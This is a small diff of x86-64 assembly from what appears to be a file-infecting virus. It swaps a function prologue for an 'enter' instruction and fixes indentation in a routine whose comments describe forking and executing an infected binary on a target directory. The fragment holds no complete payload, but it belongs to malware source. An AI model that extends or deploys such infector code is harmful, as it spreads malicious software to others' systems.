@@ -4,8 +4,7 @@ section .text
 
 ; here we fork our program, and then execute an infected binary
 _thread_create: ;void thread_create(not used, char *directory_to_infect, char *binary_path)
-    push rbp
-    mov rbp, rsp
+	enter 0, 0
 	mov rax, 0
 	push rax ; push the NULL pointer at the end of arguments
 	push rsi ; push the directory to infect (argv[2])
@@ -28,5 +27,5 @@ _parent_ret:
 	pop rdi
 	pop rdi
 	pop rdi
-    leave
+	leave
 	ret
